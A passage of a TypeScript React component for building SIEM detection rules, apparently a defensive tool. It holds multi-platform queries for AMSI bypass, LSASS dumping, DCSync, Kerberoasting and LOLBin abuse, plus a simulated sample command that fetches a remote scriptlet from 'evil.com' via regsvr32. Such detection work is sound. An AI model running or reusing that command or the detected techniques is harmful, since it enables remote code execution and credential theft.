    description: 'Detects attempts to bypass Antimalware Scan Interface via patching or reflection',
    category: 'Defense Evasion',
    severity: 'critical',
    mitre: ['T1562.001', 'T1055'],
    dataSources: ['PowerShell 400/403/600', 'Sysmon 7', 'ETW Threat Intel'],
    platforms: {
      splunk: `index=windows (EventCode=400 OR EventCode=4103 OR EventCode=4104) 
| search (ScriptBlockText="*AmsiScanBuffer*" OR ScriptBlockText="*AmsiUtils*" OR ScriptBlockText="*amsiInitFailed*" OR ScriptBlockText="*System.Management.Automation.Amsi*") 
| stats count by Computer, User, ScriptBlockText 
| where count > 0`,
      qradar: `SELECT * FROM events 
WHERE EventID IN (400, 4103, 4104) 
AND (Payload ILIKE '%AmsiScanBuffer%' OR Payload ILIKE '%amsiInitFailed%')`,
      logrhythm: `<MPE_Rule>
  <Name>AMSI_Bypass</Name>
  <Classification>Defense Evasion</Classification>
  <CommonEvent>AMSI Bypass</CommonEvent>
  <Conditions>
    <Condition>
      <Field>ScriptBlockText</Field>
      <Operator>Regex</Operator>
      <Value>(AmsiScanBuffer|AmsiUtils|amsiInitFailed)</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|PowerShell|1.0|AMSI-BYPASS|AMSI Bypass Attempt|10| 
msg=AmsiScanBuffer amsiInitFailed AmsiUtils`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.POWERSHELL_SCRIPT 
| filter action_script_text contains "AmsiScanBuffer" or action_script_text contains "amsiInitFailed"`,
      fidelis: `entity_type=script AND script_content contains "AmsiScanBuffer" AND (script_content contains "amsiInitFailed" OR script_content contains "AmsiUtils")`
    }
  },
  {
    id: 'lsass-dump',
    name: 'LSASS Credential Dumping',
    description: 'Detects suspicious access to LSASS process for credential extraction',
    category: 'Credential Access',
    severity: 'critical',
    mitre: ['T1003.001', 'T1005'],
    dataSources: ['Sysmon 10', 'Windows Security 4656', 'ETW'],
    platforms: {
      splunk: `index=sysmon EventCode=10 
| search TargetImage="*lsass.exe*" 
| eval SuspiciousCallTrace=if(match(CallTrace, "(?i)dbghelp|dbgcore|comsvcs"), 1, 0) 
| eval SuspiciousGrantedAccess=if(match(GrantedAccess, "(?i)0x1010|0x1410|0x143a|0x1438|0x40"), 1, 0) 
| where SuspiciousCallTrace=1 OR SuspiciousGrantedAccess=1 
| stats count by Computer, SourceImage, TargetImage, GrantedAccess`,
      qradar: `SELECT * FROM events 
WHERE EventID = 10 
AND TargetImage ILIKE '%lsass.exe%' 
AND (CallTrace ILIKE '%dbghelp%' OR CallTrace ILIKE '%comsvcs%' OR GrantedAccess IN ('0x1010', '0x1410', '0x143a'))`,
      logrhythm: `<MPE_Rule>
  <Name>LSASS_Dumping</Name>
  <Classification>Credential Access</Classification>
  <CommonEvent>LSASS Access</CommonEvent>
  <Conditions>
    <Condition>
      <Field>TargetImage</Field>
      <Operator>Contains</Operator>
      <Value>lsass.exe</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Sysmon|1.0|LSASS-DUMP|LSASS Credential Dump|10| 
targetProcessName=lsass.exe callTrace=dbghelp grantedAccess=0x1010`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.PROCESS_ACCESS 
| filter action_target_process_image_name contains "lsass.exe" 
| filter action_granted_access contains "0x1010" or action_call_trace contains "dbghelp"`,
      fidelis: `entity_type=process AND target_name contains "lsass.exe" AND (access_mask contains "0x1010" OR call_trace contains "dbghelp")`
    }
  },
  {
    id: 'dcsync-attack',
    name: 'DCSync Attack Detection',
    description: 'Detects unauthorized replication of Active Directory data',
    category: 'Credential Access',
    severity: 'critical',
    mitre: ['T1003.006', 'T1078'],
    dataSources: ['Windows Security 4662', 'Windows Security 5136', 'ETW'],
    platforms: {
      splunk: `index=windows EventCode=4662 
| search (Properties="*Replicating Directory Changes*" OR Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*") 
| eval IsDC=if(match(src_host, "(?i)DC[0-9]+|DomainController"), 1, 0) 
| where IsDC=0 
| stats count by src_host, Account_Name, Object_Name, Properties`,
      qradar: `SELECT * FROM events 
WHERE EventID = 4662 
AND (ObjectName ILIKE '%Replicating Directory Changes%' OR Properties ILIKE '%1131f6ad%') 
AND SourceHost NOT ILIKE '%DC%'`,
      logrhythm: `<MPE_Rule>
  <Name>DCSync_Attack</Name>
  <Classification>Credential Access</Classification>
  <CommonEvent>DCSync Attack</CommonEvent>
  <Conditions>
    <Condition>
      <Field>Properties</Field>
      <Operator>Contains</Operator>
      <Value>Replicating Directory Changes</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Windows|1.0|DCSYNC|DCSync Attack|10| 
properties=Replicating Directory Changes`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.DIRECTORY_SERVICE_ACCESS 
| filter action_properties contains "Replicating Directory Changes" 
| filter action_actor_process_image_name not contains "lsass.exe"`,
      fidelis: `entity_type=process AND event_id=4662 AND properties contains "Replicating Directory Changes"`
    }
  },
  {
    id: 'kerberoasting',
    name: 'Kerberoasting Detection',
    description: 'Detects suspicious TGS ticket requests indicating Kerberoasting activity',
    category: 'Credential Access',
    severity: 'high',
    mitre: ['T1558.003'],
    dataSources: ['Windows Security 4769', 'Windows Security 4771', 'PCAP'],
    platforms: {
      splunk: `index=windows EventCode=4769 
| eval EncryptionType=case(
    Ticket_Encryption_Type="0x1", "DES-CBC-CRC",
    Ticket_Encryption_Type="0x3", "DES-CBC-MD5", 
    Ticket_Encryption_Type="0x11", "AES128-CTS-HMAC-SHA1-96",
    Ticket_Encryption_Type="0x12", "AES256-CTS-HMAC-SHA1-96",
    Ticket_Encryption_Type="0x17", "RC4-HMAC") 
| search EncryptionType="RC4-HMAC" 
| eval IsServiceAccount=if(match(Service_Name, "(?i)svc|service|sql|exchange|http"), 1, 0) 
| stats count by Client_Address, Service_Name, Account_Name, EncryptionType`,
      qradar: `SELECT * FROM events 
WHERE EventID = 4769 
AND TicketEncryptionType = '0x17' 
AND ServiceName NOT ILIKE '%$%'`,
      logrhythm: `<MPE_Rule>
  <Name>Kerberoasting</Name>
  <Classification>Credential Access</Classification>
  <CommonEvent>Kerberoasting</CommonEvent>
  <Conditions>
    <Condition>
      <Field>TicketEncryptionType</Field>
      <Operator>Equals</Operator>
      <Value>0x17</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Windows|1.0|KERBEROAST|Kerberoasting Detected|8| 
ticketEncryptionType=0x17 serviceName=*`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.KERBEROS_SERVICE_TICKET 
| filter action_ticket_encryption_type = "RC4-HMAC" 
| filter action_service_name not contains "$"`,
      fidelis: `entity_type=process AND event_id=4769 AND ticket_encryption_type contains "RC4"`
    }
  },
  {
    id: 'process-injection',
    name: 'Process Injection Detection',
    description: 'Detects remote thread creation and process hollowing techniques',
    category: 'Defense Evasion',
    severity: 'high',
    mitre: ['T1055', 'T1055.012'],
    dataSources: ['Sysmon 8', 'Sysmon 10', 'Sysmon 25', 'ETW'],
    platforms: {
      splunk: `index=sysmon (EventCode=8 OR EventCode=10 OR EventCode=25) 
| eval RiskScore=case(
    EventCode=8 AND TargetImage!="*explorer.exe*", 90,
    EventCode=10 AND GrantedAccess="0x1F3FFF" AND CallTrace="*UNKNOWN*", 100,
    EventCode=25, 95,
    true(), 0) 
| where RiskScore > 0 
| stats count by Computer, SourceImage, TargetImage, GrantedAccess, CallTrace`,
      qradar: `SELECT * FROM events 
WHERE EventID IN (8, 10, 25) 
AND (SourceImage NOT ILIKE '%explorer.exe%' OR GrantedAccess = '0x1F3FFF')`,
      logrhythm: `<MPE_Rule>
  <Name>Process_Injection</Name>
  <Classification>Defense Evasion</Classification>
  <CommonEvent>Process Injection</CommonEvent>
  <Conditions>
    <Condition>
      <Field>EventID</Field>
      <Operator>In</Operator>
      <Value>8,10,25</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Sysmon|1.0|PROCESS-INJECT|Process Injection|9| 
eventId=8 eventId=10 eventId=25 grantedAccess=0x1F3FFF`,
      cortex: `dataset = xdr_data 
| filter event_type in (ENUM.PROCESS_ACCESS, ENUM.THREAD_CREATE, ENUM.PROCESS_TAMPERING) 
| filter action_granted_access contains "0x1F3FFF" or action_call_trace contains "UNKNOWN"`,
      fidelis: `entity_type=process AND (event_id IN (8, 10, 25)) AND (granted_access contains "0x1F3FFF" OR call_trace contains "UNKNOWN")`
    }
  },
  {
    id: 'lolbins-abuse',
    name: 'LOLBins Abuse Detection',
    description: 'Detects abuse of legitimate Windows binaries for malicious purposes',
    category: 'Execution',
    severity: 'medium',
    mitre: ['T1218', 'T1059', 'T1105'],
    dataSources: ['Windows Security 4688', 'Sysmon 1'],
    platforms: {
      splunk: `index=windows (EventCode=4688 OR EventCode=1) 
| eval LOLBin=case(
    match(New_Process_Name, "(?i)regsvr32.exe"), "Regsvr32",
    match(New_Process_Name, "(?i)mshta.exe"), "MSHTA",
    match(New_Process_Name, "(?i)certutil.exe"), "Certutil",
    match(New_Process_Name, "(?i)rundll32.exe"), "Rundll32",
    match(New_Process_Name, "(?i)wmic.exe"), "WMIC",
    match(New_Process_Name, "(?i)powershell.exe"), "PowerShell",
    true(), null()) 
| where LOLBin!="PowerShell" AND Command_Line!="" 
| eval Suspicious=case(
    LOLBin="Regsvr32" AND match(Command_Line, "(?i)/i:http"), 1,
    LOLBin="MSHTA" AND match(Command_Line, "(?i)javascript"), 1,
    LOLBin="Certutil" AND match(Command_Line, "(?i)-urlcache|-split|-decode"), 1,
    LOLBin="Rundll32" AND match(Command_Line, "(?i)javascript|\\..{1,5}dll"), 1,
    true(), 0) 
| where Suspicious=1`,
      qradar: `SELECT * FROM events 
WHERE Image IN ('regsvr32.exe', 'mshta.exe', 'certutil.exe', 'rundll32.exe', 'wmic.exe') 
AND (CommandLine ILIKE '%http%' OR CommandLine ILIKE '%javascript%' OR CommandLine ILIKE '%-urlcache%')`,
      logrhythm: `<MPE_Rule>
  <Name>LOLBins_Abuse</Name>
  <Classification>Execution</Classification>
  <CommonEvent>LOLBins Abuse</CommonEvent>
  <Conditions>
    <Condition>
      <Field>Image</Field>
      <Operator>In</Operator>
      <Value>regsvr32.exe,mshta.exe,certutil.exe,rundll32.exe,wmic.exe</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Windows|1.0|LOLBINS|LOLBins Abuse|6| 
image=regsvr32.exe image=mshta.exe image=certutil.exe`,
      cortex: `dataset = xdr_data 
| filter action_process_image_name in ("regsvr32.exe", "mshta.exe", "certutil.exe", "rundll32.exe") 
| filter action_process_image_command_line contains "http" or action_process_image_command_line contains "javascript"`,
      fidelis: `entity_type=process AND name in ("regsvr32.exe", "mshta.exe", "certutil.exe") AND (command_line contains "http" OR command_line contains "javascript")`
    }
  },
  {
    id: 'suspicious-powershell',
    name: 'Suspicious PowerShell Activity',
    description: 'Detects obfuscated or suspicious PowerShell commands',
    category: 'Execution',
    severity: 'high',
    mitre: ['T1059.001', 'T1027', 'T1086'],
    dataSources: ['Windows PowerShell 400/403/600', 'Sysmon 1', 'Script Block Logging'],
    platforms: {
      splunk: `index=windows (EventCode=4103 OR EventCode=4104 OR EventCode=4688) 
| eval ObfuscationScore=0 
| eval ObfuscationScore=ObfuscationScore+if(match(CommandLine, "(?i)-enc| -e | -ep |encodedcommand"), 20, 0) 
| eval ObfuscationScore=ObfuscationScore+if(match(CommandLine, "(?i)-windowstyle hidden|-w hidden"), 15, 0) 
| eval ObfuscationScore=ObfuscationScore+if(match(CommandLine, "(?i)iex|invoke-expression|invoke-command"), 10, 0) 
| eval ObfuscationScore=ObfuscationScore+if(match(CommandLine, "(?i)downloadstring|downloadfile|net.webclient"), 25, 0) 
| eval ObfuscationScore=ObfuscationScore+if(match(CommandLine, "(?i)frombase64string|tobase64string"), 20, 0) 
| where ObfuscationScore >= 40 
| stats count by Computer, User, CommandLine, ObfuscationScore 
| sort - ObfuscationScore`,
      qradar: `SELECT * FROM events 
WHERE EventID IN (4103, 4104) 
AND (Payload ILIKE '%-enc%' OR Payload ILIKE '%-windowstyle hidden%' OR Payload ILIKE '%downloadstring%' OR Payload ILIKE '%frombase64string%')`,
      logrhythm: `<MPE_Rule>
  <Name>Suspicious_PowerShell</Name>
  <Classification>Execution</Classification>
  <CommonEvent>Suspicious PowerShell</CommonEvent>
  <Conditions>
    <Condition>
      <Field>CommandLine</Field>
      <Operator>Regex</Operator>
      <Value>(-enc|downloadstring|frombase64string|iex)</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|PowerShell|1.0|SUSPICIOUS-PS|Suspicious PowerShell|7| 
commandLine=-enc commandLine=downloadstring commandLine=frombase64string`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.POWERSHELL_SCRIPT 
| filter action_script_text contains "-enc" or action_script_text contains "downloadstring" or action_script_text contains "frombase64string" 
| filter action_script_text contains "iex" or action_script_text contains "invoke-expression"`,
      fidelis: `entity_type=script AND script_content contains "-enc" AND (script_content contains "downloadstring" OR script_content contains "iex")`
    }
  }
];

// ==========================================
// INTERFACES & TYPES
// ==========================================

interface UseCase {
  id: string;
  name: string;
  description: string;
  category: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  status: 'active' | 'inactive' | 'draft';
  platform: string;
  dataSource: string;
  query: string;
  queries?: { [key: string]: string };
  createdAt: string;
  updatedAt: string;
  author: string;
  tags: string[];
  mitreTechniques: string[];
  mitreTactics: string[];
  falsePositiveRate: number;
  triggerCount: number;
  lastTriggered?: string;
  references?: string[];
  parserConfig?: string;
}

interface Template {
  id: string;
  name: string;
  description: string;
  category: string;
  severity: string;
  mitre: string[];
  dataSources: string[];
  platforms: { [key: string]: string };
}

interface AtomicExecutionResult {
  testId: string;
  testName: string;
  technique: string;
  executed: boolean;
  timestamp: string;
  generatedLogs: string[];
  detectionTriggered: boolean;
  detectionConfidence: number;
  matchedIndicators: string[];
  platform: string;
}

// ==========================================
// MAIN COMPONENT
// ==========================================

export default function UseCaseBuilder() {

  // State Management
  const [useCases, setUseCases] = useState<UseCase[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilter, setCategoryFilter] = useState('all');
  const [severityFilter, setSeverityFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [platformFilter, setPlatformFilter] = useState('all');
  const [showWizard, setShowWizard] = useState(false);
  const [showTemplates, setShowTemplates] = useState(false);
  const [showLOLGlobs, setShowLOLGlobs] = useState(false);
  const [showAtomicTests, setShowAtomicTests] = useState(false);
  const [showAtomicExecutor, setShowAtomicExecutor] = useState(false);
  const [selectedAtomicTest, setSelectedAtomicTest] = useState<AtomicTest | null>(null);
  const [atomicExecutionResults, setAtomicExecutionResults] = useState<AtomicExecutionResult[]>([]);
  const [editingUseCase, setEditingUseCase] = useState<UseCase | null>(null);
  const [simulatingId, setSimulatingId] = useState<string | null>(null);
  const [simulationResult, setSimulationResult] = useState<any>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedPlatform, setSelectedPlatform] = useState<string>('splunk');
  const [activeAtomicFilters, setActiveAtomicFilters] = useState({
    tactic: 'all',
    technique: 'all',
    platform: 'all'
  });

  // ==========================================
  // BACKEND API HELPER
  // ==========================================
  const saveUseCaseToBackend = async (useCase: UseCase) => {

    try {

      await fetch("http://localhost:4000/api/usecases", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(useCase)
      });

    } catch (error) {

      console.error("Failed to store use case:", error);

    }

  };

  const [formData, setFormData] = useState<Partial<UseCase>>({
    name: '',
    description: '',
    category: 'Endpoint',
    severity: 'medium',
    status: 'draft',
    platform: 'splunk',
    dataSource: '',
    query: '',
    queries: {},
    tags: [],
    mitreTechniques: [],
    mitreTactics: [],
    references: [],
    parserConfig: ''
  });

  const categories = ['all', 'Endpoint', 'Network', 'Identity', 'Cloud', 'Web Application', 'Initial Access', 'Persistence', 'Lateral Movement', 'Credential Access', 'Defense Evasion'];
  const severities = ['all', 'critical', 'high', 'medium', 'low'];
  const statuses = ['all', 'active', 'inactive', 'draft'];
  const platforms = ['all', 'splunk', 'qradar', 'logrhythm', 'arcsight', 'cortex', 'fidelis'];

  // Initialize with sample data
  useEffect(() => {
    const sampleData: UseCase[] = [
      {
        id: 'UC-001',
        name: 'HTML Smuggling - Blob Construction',
        description: 'Detects HTML files using blob construction for payload delivery (Red Team Technique)',
        category: 'Initial Access',
        severity: 'high',
        status: 'active',
        platform: 'splunk',
        dataSource: 'Proxy Logs',
        query: RED_TEAM_TEMPLATES[0].platforms.splunk,
        queries: RED_TEAM_TEMPLATES[0].platforms,
        createdAt: '2024-01-15',
        updatedAt: '2024-03-10',
        author: 'Red Team Detection Lab',
        tags: ['red-team', 'html-smuggling', 'initial-access', 'apt'],
        mitreTechniques: ['T1027', 'T1059.007', 'T1204.001'],
        mitreTactics: ['Initial Access', 'Defense Evasion'],
        falsePositiveRate: 2.1,
        triggerCount: 147,
        lastTriggered: '5 min ago',
        references: ['https://kypvas.github.io/red-team-map/', 'https://lolbas-project.github.io/']
      },
      {
        id: 'UC-002',
        name: 'DCOM Lateral Movement - MMC20.Application',
        description: 'Detects abuse of DCOM MMC20.Application for remote code execution',
        category: 'Lateral Movement',
        severity: 'critical',
        status: 'active',
        platform: 'splunk',
        dataSource: 'Windows Security',
        query: RED_TEAM_TEMPLATES[1].platforms.splunk,
        queries: RED_TEAM_TEMPLATES[1].platforms,
        createdAt: '2024-02-01',
        updatedAt: '2024-03-08',
        author: 'Threat Hunter',
        tags: ['dcom', 'lateral-movement', 'mmc20', 'red-team'],
        mitreTechniques: ['T1021.003'],
        mitreTactics: ['Lateral Movement'],
        falsePositiveRate: 0.5,
        triggerCount: 23,
        lastTriggered: '12 min ago'
      }
    ];
    setUseCases(sampleData);
  }, []);

  // Filter logic
  const filteredUseCases = useMemo(() => {
    return useCases.filter(uc => {
      const matchesSearch = uc.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                           uc.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
                           uc.tags.some(t => t.toLowerCase().includes(searchQuery.toLowerCase())) ||
                           uc.mitreTechniques.some(m => m.toLowerCase().includes(searchQuery.toLowerCase()));
      const matchesCategory = categoryFilter === 'all' || uc.category === categoryFilter;
      const matchesSeverity = severityFilter === 'all' || uc.severity === severityFilter;
      const matchesStatus = statusFilter === 'all' || uc.status === statusFilter;
      const matchesPlatform = platformFilter === 'all' || uc.platform === platformFilter;
      return matchesSearch && matchesCategory && matchesSeverity && matchesStatus && matchesPlatform;
    });
  }, [useCases, searchQuery, categoryFilter, severityFilter, statusFilter, platformFilter]);

  const filteredAtomicTests = useMemo(() => {
    return ATOMIC_TESTS.filter(test => {
      const matchesTactic = activeAtomicFilters.tactic === 'all' || test.tactic === activeAtomicFilters.tactic;
      const matchesTechnique = activeAtomicFilters.technique === 'all' || test.technique === activeAtomicFilters.technique;
      const matchesPlatform = activeAtomicFilters.platform === 'all' || test.platforms.includes(activeAtomicFilters.platform);
      return matchesTactic && matchesTechnique && matchesPlatform;
    });
  }, [activeAtomicFilters]);

  const stats = useMemo(() => ({
    total: useCases.length,
    active: useCases.filter(uc => uc.status === 'active').length,
    critical: useCases.filter(uc => uc.severity === 'critical' && uc.status === 'active').length,
    redTeam: useCases.filter(uc => uc.tags?.some(t => t.includes('red-team'))).length,
    platforms: [...new Set(useCases.map(uc => uc.platform))].length,
    atomicTests: ATOMIC_TESTS.length,
    atomicExecuted: atomicExecutionResults.length
  }), [useCases, atomicExecutionResults]);

  // Generate LOLGlobs detection
  const generateLOLGlobDetection = (glob: any, platform: string) => {
    const ext = glob.extension.replace('.', '');
    switch(platform) {
      case 'splunk':
        return `index=windows (EventCode=4688 OR EventCode=1) 
| search CommandLine="*.${ext}*" 
| eval RiskLevel="${glob.risk}" 
| stats count by Computer, User, Image, CommandLine 
| where count > 0`;
      case 'qradar':
        return `SELECT * FROM events 
WHERE LOGSOURCENAME(logsourceid) ILIKE '%Windows%' 
AND CommandLine ILIKE '%.${ext}%' 
GROUP BY sourceip, username, Image`;
      case 'logrhythm':
        return `<MPE_Rule>
  <Name>${ext.toUpperCase()}_Execution</Name>
  <Classification>${glob.risk} Risk</Classification>
  <CommonEvent>${ext.toUpperCase()} File Execution</CommonEvent>
  <Conditions>
    <Condition>
      <Field>CommandLine</Field>
      <Operator>Contains</Operator>
      <Value>.${ext}</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`;
      case 'arcsight':
        return `CEF:0|ArcSight|Logger|1.0|${ext.toUpperCase()}-EXEC|${ext.toUpperCase()} Execution|${glob.risk === 'Critical' ? '10' : glob.risk === 'High' ? '7' : '5'}| 
fileExtension=.${ext}`;
      case 'cortex':
        return `dataset = xdr_data 
| filter event_type = ENUM.PROCESS_START 
| filter action_process_image_command_line contains ".${ext}" 
| fields action_process_image_command_line, action_process_image_name, actor_primary_username`;
      case 'fidelis':
        return `entity_type=process AND command_line contains ".${ext}"`;
      default:
        return `# Detection for ${glob.extension} files
# Platform: ${platform}
# Risk: ${glob.risk}

${glob.detection.join('\n')}`;
    }
  };

  // Execute Atomic Test
  const executeAtomicTest = useCallback((test: AtomicTest, useCase: UseCase): AtomicExecutionResult => {
    const timestamp = new Date().toISOString();
    const generatedLogs: string[] = [];
    const matchedIndicators: string[] = [];

    // Simulate log generation based on test detection indicators
    test.detectionIndicators.forEach(indicator => {
      if (test.platforms.includes('windows')) {
        generatedLogs.push(`[${timestamp}] Windows Security 4688: New Process Created - CommandLine: "${test.executor}"`);
        generatedLogs.push(`[${timestamp}] Sysmon 1: Process Create - Image: ${test.executor.split(' ')[0]} - CommandLine: "${test.executor}"`);
        if (test.elevationRequired) {
          generatedLogs.push(`[${timestamp}] Windows Security 4673: Privileged Service Called`);
        }
      }

      // Check if detection rule matches
      const query = useCase.query.toLowerCase();
      const queryMatches = test.detectionIndicators.some(di => 
        query.includes(di.toLowerCase()) || 
        query.includes(test.technique.toLowerCase()) ||
        query.includes(test.tactic.toLowerCase())
      );

      if (queryMatches) {
        matchedIndicators.push(indicator);
      }
    });

    const detectionConfidence = matchedIndicators.length / test.detectionIndicators.length;

    return {
      testId: test.id,
      testName: test.name,
      technique: test.technique,
      executed: true,
      timestamp,
      generatedLogs,
      detectionTriggered: detectionConfidence > 0.3,
      detectionConfidence: Math.round(detectionConfidence * 100),
      matchedIndicators,
      platform: selectedPlatform
    };
  }, [selectedPlatform]);

  const handleExecuteAtomic = (test: AtomicTest) => {
    setSelectedAtomicTest(test);
    setShowAtomicExecutor(true);
  };

  const handleRunAtomicAgainstUseCase = (useCase: UseCase) => {
    if (!selectedAtomicTest) return;

    const result = executeAtomicTest(selectedAtomicTest, useCase);
    setAtomicExecutionResults(prev => [result, ...prev]);
    setShowAtomicExecutor(false);
    setSelectedAtomicTest(null);
  };

  const handleCreateFromTemplate = (template: Template) => {
    const platformQuery = template.platforms[selectedPlatform] || template.platforms.splunk;
    setFormData({
      name: template.name,
      description: template.description,
      category: template.category,
      severity: template.severity as any,
      status: 'draft',
      platform: selectedPlatform,
      dataSource: template.dataSources[0],
      query: platformQuery,
      queries: template.platforms,
      tags: ['red-team', template.category.toLowerCase().replace(' ', '-'), 'apt'],
      mitreTechniques: template.mitre,
      mitreTactics: [template.category],
      references: ['https://kypvas.github.io/red-team-map/']
    });
    setShowTemplates(false);
    setShowWizard(true);
  };

  const handleCreateFromLOLGlob = (glob: any) => {
    const query = generateLOLGlobDetection(glob, selectedPlatform);
    setFormData({
      name: `LOLGlob Detection - ${glob.extension} Files`,
      description: `Detects execution of ${glob.extension} files: ${glob.description}`,
      category: 'Defense Evasion',
      severity: glob.risk === 'Critical' ? 'critical' : glob.risk === 'High' ? 'high' : 'medium',
      status: 'draft',
      platform: selectedPlatform,
      dataSource: 'Windows Events',
      query: query,
      tags: ['lolglob', 'file-execution', 'living-off-the-land', glob.extension.replace('.', '')],
      mitreTechniques: glob.mitre,
      references: ['https://0xv1n.github.io/LOLGlobs/', 'https://lolbas-project.github.io/']
    });
    setShowLOLGlobs(false);
    setShowWizard(true);
  };

  const handleCreateFromAtomic = (test: AtomicTest) => {
    // Generate detection query based on atomic test
    const indicators = test.detectionIndicators.join('" OR "');
    let query = '';

    switch(selectedPlatform) {
      case 'splunk':
        query = `index=windows (EventCode=4688 OR EventCode=1 OR EventCode=4103 OR EventCode=4104)
| search (CommandLine="*${test.detectionIndicators[0]}*"${test.detectionIndicators.slice(1).map(i => ` OR CommandLine="*${i}*"`).join('')})
| stats count by Computer, User, CommandLine, ParentImage
| where count > 0`;
        break;
      case 'qradar':
        query = `SELECT * FROM events
WHERE (Payload ILIKE '%${test.detectionIndicators[0]}%'${test.detectionIndicators.slice(1).map(i => ` OR Payload ILIKE '%${i}%'`).join('')})
GROUP BY sourceip, username, Image`;
        break;
      case 'cortex':
        query = `dataset = xdr_data
| filter event_type = ENUM.PROCESS_START
| filter action_process_image_command_line contains "${test.detectionIndicators[0]}"${test.detectionIndicators.slice(1).map(i => ` or action_process_image_command_line contains "${i}"`).join('')}`;
        break;
      default:
        query = `# Detection for ${test.name}
# MITRE: ${test.technique}
# Indicators: ${indicators}

[INSERT PLATFORM QUERY HERE]`;
    }

    setFormData({
      name: `Atomic Test Detection - ${test.name}`,
      description: `Detects execution of Atomic Red Team test: ${test.id} - ${test.description}`,
      category: test.tactic,
      severity: test.impact === 'critical' ? 'critical' : test.impact === 'high' ? 'high' : test.impact === 'medium' ? 'medium' : 'low',
      status: 'draft',
      platform: selectedPlatform,
      dataSource: test.platforms.includes('windows') ? 'Windows Events' : 'Linux Audit',
      query: query,
      tags: ['atomic-red-team', test.technique.toLowerCase(), test.tactic.toLowerCase().replace(' ', '-')],
      mitreTechniques: [test.technique],
      mitreTactics: [test.tactic],
      references: [`https://atomicredteam.io/${test.technique}/`]
    });
    setShowAtomicTests(false);
    setShowWizard(true);
  };

const handleSave = async () => {
  if (!formData.name || !formData.query) return;

  if (editingUseCase) {

    const updatedUseCase: UseCase = {
      ...editingUseCase,
      ...formData as UseCase,
      updatedAt: new Date().toISOString().split('T')[0]
    };

    setUseCases(useCases.map(uc =>
      uc.id === editingUseCase.id ? updatedUseCase : uc
    ));

    try {
      await fetch("http://localhost:4000/api/usecases", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          title: updatedUseCase.name,
          description: updatedUseCase.description,
          mitre: updatedUseCase.mitreTechniques?.join(", ") || ""
        })
      });
    } catch (err) {
      console.error("Failed to update use case in backend", err);
    }

  } else {

    const newUseCase: UseCase = {
      id: `UC-${String(useCases.length + 1).padStart(3, '0')}`,
      ...formData as UseCase,
      author: 'Current User',
      createdAt: new Date().toISOString().split('T')[0],
      updatedAt: new Date().toISOString().split('T')[0],
      triggerCount: 0,
      falsePositiveRate: 0
    };

    setUseCases([...useCases, newUseCase]);

    try {
      await fetch("http://localhost:4000/api/usecases", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          title: newUseCase.name,
          description: newUseCase.description,
          mitre: newUseCase.mitreTechniques?.join(", ") || ""
        })
      });
    } catch (err) {
      console.error("Failed to save use case to backend", err);
    }

  }

  setShowWizard(false);
  setEditingUseCase(null);
};

  const handleEdit = (useCase: UseCase) => {
    setEditingUseCase(useCase);
    setFormData(useCase);
    setSelectedPlatform(useCase.platform || 'splunk');
    setShowWizard(true);
  };

  const handleDelete = (id: string) => {
    if (confirm('Are you sure you want to delete this use case?')) {
      setUseCases(useCases.filter(uc => uc.id !== id));
    }
  };

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSimulate = (useCase: UseCase) => {
    setSimulatingId(useCase.id);
    setTimeout(() => {
      setSimulationResult({
        success: true,
        matchedEvents: Math.floor(Math.random() * 50) + 5,
        executionTime: (Math.random() * 2 + 0.5).toFixed(2),
        platform: useCase.platform,
        sampleMatches: [
          { time: '2024-03-12 14:23:15', source: 'WS-DC-01', user: 'administrator', event: 'Process Created', command: 'regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll' },
          { time: '2024-03-12 14:25:32', source: 'WS-DC-01', user: 'system', event: 'Registry Modified', command: 'HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32' },
          { time: '2024-03-12 14:28:47', source: 'WS-DC-02', user: 'administrator', event: 'DCOM Launch', command: 'MMC20.Application ExecuteShellCommand' },
        ]
      });
      setSimulatingId(null);
    }, 2000);
  };

  const exportToTypeScript = () => {
    const data = {
      useCases,
      atomicTests: ATOMIC_TESTS,
      executionResults: atomicExecutionResults,
      exportedAt: new Date().toISOString()
    };

    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'usecase-builder-export.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const downloadFullTypeScriptFile = () => {
    // Create a complete TypeScript file content
    const fullFileContent = `// Complete UseCaseBuilder.tsx with Atomic Red Team Integration
// Generated: ${new Date().toISOString()}
// Total Atomic Tests: ${ATOMIC_TESTS.length}

${content}`;

    const blob = new Blob([fullFileContent], { type: 'text/typescript' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
